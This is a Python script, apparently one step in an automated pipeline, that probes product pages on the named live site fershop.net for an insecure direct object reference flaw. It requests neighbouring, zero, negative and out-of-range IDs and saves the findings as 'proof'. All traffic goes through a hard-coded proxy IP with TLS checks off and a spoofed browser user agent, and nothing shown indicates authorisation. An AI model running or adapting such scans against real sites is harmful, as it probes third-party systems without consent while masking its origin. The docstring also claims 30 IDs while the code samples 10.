"""
Step 3: 检查 fershop 抽样 ID 的越界访问情况
- 直接对 30 个产品 ID 验证: in-range (±1) / out-range (max/0/negative)
- 输出详细的 status_code + length, 看到底是不是 IDOR
"""
import sys, json, time
from pathlib import Path
from urllib.parse import urlparse, urlunparse
import requests
import urllib3
urllib3.disable_warnings()

OUT = Path(".pipeline_output")
PROXY = "http://3.211.120.181:443"
PROXIES = {"http": PROXY, "https": PROXY}
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0"}


def probe(url, proxies=PROXIES):
    try:
        r = requests.get(url, timeout=8, verify=False, headers=HEADERS, allow_redirects=True,
                        proxies=proxies)
        return r.status_code, len(r.content)
    except Exception as e:
        return f"ERR:{str(e)[:30]}", 0


# 抽样 10 个 ID (从原 inventory)
sample_pids = [3, 28, 50, 100, 200, 400, 600, 800, 900, 950]
print(f"{'PID':>5s} {'in-1':>8s} {'in+1':>8s} {'MAX':>8s} {'ZERO':>8s} {'NEG':>8s}")
print("-" * 60)

results = []
for pid in sample_pids:
    base = f"https://fershop.net/catalog/product/{pid}"
    s_in_minus, l_in_minus = probe(f"https://fershop.net/catalog/product/{pid-1}")
    s_in_plus, l_in_plus = probe(f"https://fershop.net/catalog/product/{pid+1}")
    s_max, l_max = probe(f"https://fershop.net/catalog/product/9999")
    s_zero, l_zero = probe(f"https://fershop.net/catalog/product/0")
    s_neg, l_neg = probe(f"https://fershop.net/catalog/product/-1")

    print(f"{pid:>5d} {str(s_in_minus):>8s} {str(s_in_plus):>8s} {str(s_max):>8s} {str(s_zero):>8s} {str(s_neg):>8s}")
    print(f"      {l_in_minus:>6d}B {l_in_plus:>6d}B {l_max:>6d}B {l_zero:>6d}B {l_neg:>6d}B")
    results.append({
        "pid": pid,
        "in_minus": (s_in_minus, l_in_minus),
        "in_plus": (s_in_plus, l_in_plus),
        "max_9999": (s_max, l_max),
        "zero": (s_zero, l_zero),
        "neg_minus1": (s_neg, l_neg),
    })
    time.sleep(0.3)

with open(OUT / "fershop_idor_proof.json", "w") as f:
    json.dump(results, f, indent=2)

# 分析
print()
print("分析:")
for r in results:
    base_pid = r["pid"]
    base_url = f"https://fershop.net/catalog/product/{base_pid}"
    base_status, base_len = probe(base_url)
    print(f"  基线 PID={base_pid}: {base_status} {base_len}B")

    # 全部 200 + size 接近 → IDOR (ID 是顺序但无校验)
    all_ok = (r["in_minus"][0] == 200 and r["in_plus"][0] == 200 and
              r["max_9999"][0] == 200 and r["zero"][0] == 200 and
              r["neg_minus1"][0] == 200)
    if all_ok:
        print(f"    ⚠️ 全部 200 → 越界访问均允许 (IDOR 弱访问控制)")

with open(OUT / "fershop_idor_proof.json", "w") as f:
    json.dump(results, f, indent=2, default=str)
